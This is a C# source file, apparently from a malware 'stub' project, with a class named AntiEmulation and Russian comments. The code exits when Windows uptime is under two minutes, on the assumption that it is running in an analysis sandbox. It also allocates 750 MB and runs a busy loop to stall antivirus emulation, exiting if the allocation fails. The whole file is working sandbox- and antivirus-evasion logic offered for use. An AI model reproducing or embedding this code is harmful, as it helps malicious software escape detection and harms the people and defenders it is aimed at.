using Stub.Help;
using Stub.Help.Native;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stub.Protection
{
     class AntiEmulation
    {
        public static void Run() 
        {
            // Защита от рантайм детекта, просто закрываемся если с момента запуска Windows прошло менее 2 минут.
            // Так как скорее всего это виртуальная среда для анализа поведения файла.
            ulong uptime = NativeMethods.GetTickCount64();
            TimeSpan uptimeSpan = TimeSpan.FromMilliseconds(uptime);
            if (uptimeSpan.TotalMinutes < 2)
            {
                Environment.Exit(0);
            }

            // Выделяем память, Вгоняем АВ в ступор.
            int sizeInMB = 750;
            int sizeInBytes = sizeInMB * 1024 * 1024; // Переводим размер из мегабайт в байты
            try
            {
                byte[] memory = new byte[sizeInBytes];
                    int i = 0;
                    while(true)
                    {
                        if (i == 10000000)
                            break;
                        else
                            i++;
                    }
            }
            catch (OutOfMemoryException)
            {
                Environment.Exit(0);
            }
        }
    }
}
